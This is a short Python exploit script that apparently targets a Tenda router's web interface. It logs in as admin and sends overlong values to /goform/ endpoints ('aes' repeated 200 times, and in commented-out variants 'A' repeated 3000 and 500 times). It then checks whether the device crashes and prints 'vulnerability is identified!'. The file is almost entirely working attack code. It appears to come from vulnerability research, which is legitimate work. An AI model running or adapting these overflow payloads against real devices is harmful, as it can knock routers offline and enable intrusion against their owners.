#!/usr/bin/env python

import requests
import time
import socket

url = "http://192.168.0.1/login/Auth"

headers = {
'Host': '192.168.0.1',
'Connection': 'keep-alive',
'Content-Length': '56',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin': 'http://192.168.0.1',
'Referer': 'http://192.168.0.1/login.html',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
}

data = {
'username':'admin',
'password':'d9fcfc252573913dff4413900fb24a2f'
}

def init_request():
    r1 = requests.get(url="http://192.168.0.1/login.html")

def login():
    r = requests.post(url=url, headers=headers, data=data, allow_redirects=False)
    cookie = r.headers['Set-Cookie']
    headers['Cookie'] = r.headers['Set-Cookie']
    return cookie


def test_interface(interface, the_dict):
    url = "http://192.168.0.1/goform/"+interface
    resp = requests.post(url=url, headers=headers, data=the_dict)
    print(resp.content)

def main():
    init_request()
    cookie = login()

    # interface = 'WifiBasicSet'
    # the_dict = {
    #     "wrlEn": "1",
    #     "wrlEn_5g": "1",
    #     "security": "none",
    #     "security_5g": "A" * 3000,
    #     "ssid": "Tenda_xxx",
    #     "ssid_5g": "Tenda_xxx_5G",
    #     "hideSsid": "0",
    #     "hideSsid_5g": "0",
    #     "wrlPwd": "",
    #     "wrlPwd_5g": "12345678"
    # }

    # interface = 'SetOnlineDevName'
    # the_dict = {
    #     "mac": "36:E1:2D:95:9A:AC",
    #     "devName": "A" * 500
    # }

    interface = 'WifiExtraSet'
    the_dict = {
        "wl_mode": "wisp",
        "ssid": "NETGEAR25",
        "security": "wpapsk",
        "wpapsk_type": "wpa2",
        "wpapsk_crypto": "aes"*200,
        "wpapsk_key": "54321",
        "wifi_chkHz": "0",
        "mac": "10%3Ada%3A43%3A18%3Ae9%3A04",
        "handset": "0"
    }

    print(the_dict)
    try:
        test_interface(interface,the_dict)
    except Exception as e:
        print("exception:{}".format(e))
        try:
            requests.get(url="http://192.168.0.1/login.html")
        except Exception as e:
            print("re-connection exception")
            print("vulnerability is identified!")

if __name__ == '__main__':
    main()


